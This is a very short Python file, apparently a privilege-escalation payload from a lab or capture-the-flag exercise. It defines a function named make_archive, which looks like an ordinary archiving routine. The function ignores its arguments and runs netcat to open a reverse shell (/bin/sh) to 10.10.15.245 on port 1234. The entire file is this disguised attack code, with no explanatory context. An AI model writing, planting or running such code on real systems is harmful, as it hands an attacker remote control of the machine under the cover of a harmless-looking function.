import os 

def make_archive(a, b, c): 
	os.system('nc 10.10.15.245 1234 -e "/bin/sh"')
